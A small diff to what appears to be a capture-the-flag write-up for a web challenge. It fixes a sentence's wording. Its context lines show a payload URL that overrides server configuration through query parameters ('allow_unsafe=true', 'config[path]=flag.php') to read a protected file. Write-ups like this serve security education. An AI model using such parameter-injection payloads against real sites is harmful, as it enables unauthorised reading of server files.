@@ -167,7 +167,7 @@ Here's the payload to read the actual flag.php:
 https://web-philtered-0a2005e5b9bf.2025.ductf.net/?allow_unsafe=true&config[data_folder]=&config[path]=flag.php
 ```
 
-The main interface might normal...but if you hit **Ctrl + U** to view the page source…
+The main interface might look normal at first...but if we hit **Ctrl + U** to view the page source…
 
 ![The flag](flag_phil.png){: width="800" height="800" .shadow}
 
